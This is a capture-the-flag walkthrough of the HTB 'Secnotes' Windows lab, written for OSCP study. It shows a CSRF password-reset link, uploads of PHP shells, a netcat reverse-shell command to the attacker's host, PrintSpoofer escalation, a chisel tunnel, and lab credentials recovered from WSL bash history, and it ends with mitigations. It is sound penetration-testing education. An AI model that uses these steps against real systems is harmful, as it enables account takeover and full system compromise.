---
title: Secnotes
date: 2025-06-23
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, Windows, CSRF, password-reset, PrintSpoofer, wsl] 
image: sec.png
media_subpath: /assets/img/posts/2025-06-23-secnotesHTB/
---

## Introduction

In this walkthrough, I worked on an **Intermediate Windows machine** on HTB. I started by exploiting a **CSRF vulnerability** to craft a malicious password reset link and delivered it to a user. Once the target visited the link, I reset their password and logged in, obtaining **SMB credentials**. From here, I explored two paths to initial access:

- **Path 1**: I uploaded a **reverse shell** and executed it via the web interface, gaining access as the **`iis apppool`** user.
- **Path 2**: I uploaded a **PHP web shell** and executed the reverse shell to gain access as **`tyler`**.

For privilege escalation:

- As `iis apppool`, I leveraged **PrintSpoofer** to obtain a `SYSTEM` shell.
- As `tyler`, I discovered **WSL (Windows Subsystem for Linux)** was enabled and abused it to escalate to `Administrator`.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

![image.png](image%202.png)

## Services

### Port 445

```bash
smbclient -L //$IP/ -N
```

**NT_STATUS_ACCESS_DENIED**

## Web

### Port 80

![image.png](image%203.png)

```bash
**feroxbuster -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt -C 403,404,400 -x .php**
```

![image.png](image%204.png)

### Port 8808

![image.png](image%205.png)

## Exploitation

I have registered an account in web application, and I see a user `tyler@secnotes.htb`. When you find websites where `password changing` option present where it `does not require old password` to be parsed and `GET request works` you can send a maliciously crafted link to the target logged-in user and make them change their passwords, this is a potential CSRF attack, where **malicious actor tricks a `logged-in user` into performing an unwanted action** on a web application — **without the user’s knowledge or consent**.

![image.png](image%206.png)

Let’s make a `GET` request from this using `CHANGE REQUEST METHOD` option in Burp.

```bash
http://10.10.10.97/change_pass.php?password=password123&confirm_password=password123&submit=submit
```

Let’s send this too to `tyler` using `Contact` section. After sending it wait a little bit and then try to login to application using password you set.

As you can see we were able to login:

![image.png](image%207.png)

I found an interesting note:

![image.png](image%208.png)

Checking shares:

```bash
sudo nxc smb $IP -u 'tyler'  -p '92g!mA8BGjOirkL%OG*&' --shares
```

![image.png](image%209.png)

```bash
smbclient //$IP/new-site -U tyler
```

![image.png](image%2010.png)

It seems this is a default IIS website we encountered on port 8808.

I see that site uses `PHP` I am gonna put there a `PHP` reverse shell.

![image.png](image%2011.png)

![image.png](image%2012.png)

After executing it I am in:

![image.png](image%2013.png)

For some reason shell kept dying so I am gonna put there a `nc64.exe` and get another shell.

```bash
c:\tools\nc64.exe 10.10.14.23 4444 -e cmd
```

## 1st way

### Shell as iis appool\newsite

Checking privileges I see powerful privileges:

![image.png](image%2014.png)

I am gonna use `PrintSpoofer` to get NT Authority\System shell.

```powershell
.\PrintSpoofer.exe -i -c cmd
```

![image.png](image%2015.png)

## 2nd way

### Shell as tyler

Interestingly when you put web shell php script it runs it as `tyler` user.

![image.png](image%2016.png)

Checking open ports I see `MySQL` running:

![image.png](image%2017.png)

And reading `db.php` I see database credentials:

![image.png](image%2018.png)

Let’s port forward `3306` and connect to it using these credentials with `chisel`.

```bash
./chisel_1.10.1_linux_amd64 server --reverse --port 51234
.\chisel.exe client 10.10.14.23:51234 R:3306:127.0.0.1:3306
```

```bash
mysql -u secnotes -h 127.0.0.1 -p
```

```sql
SHOW databases;
use secnotes;
show tables;
show columns from users;
select * from users;
```

![image.png](image%2019.png)

![image.png](image%2020.png)

Nothing interesting here.

I found `wsl` and `bash`:

```powershell
where /R c:\windows bash.exe
```

![image.png](image%2021.png)

```powershell
where /R c:\windows wsl.exe
```

![image.png](image%2022.png)

I tried executing them to get into Linux shell, but it failed likely because of tty. I tried navigating to `LocalState\rootfs`, but still failed:

```powershell
Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss | %{Get-ItemProperty $_.PSPath} | Out-String -Width 4096
```

This lists all WSL distributions registered under the current user, showing details like their GUIDs, names, and base paths.

![image.png](image%2023.png)

![image.png](image%2024.png)

Checking `.bash_history` file I see:

![image.png](image%2025.png)

Here is administrator password.

```powershell
sudo nxc smb $IP -u administrator  -p 'u6!4ZwgwOM#^OBf#Nwnh' --shares
```

![image.png](image%2026.png)

### Credentials

```bash
tyler / 92g!mA8BGjOirkL%OG*&
secnotes:q8N#9Eos%JinE57tke72 #database
administrator:u6!4ZwgwOM#^OBf#Nwnh
```

## Mitigation

- Implement **CSRF tokens** and verify **Referer/Origin headers** to prevent CSRF attacks.
- Secure **file upload mechanisms** with strict content validation and execution restrictions.
- Limit privileges of service accounts like `iis apppool`.
- Regularly audit for **PrintSpoofer** and **WSL abuse vectors**, and apply updates to mitigate privilege escalation.
- Use **network segmentation** and monitoring to detect abnormal SMB and internal traffic.
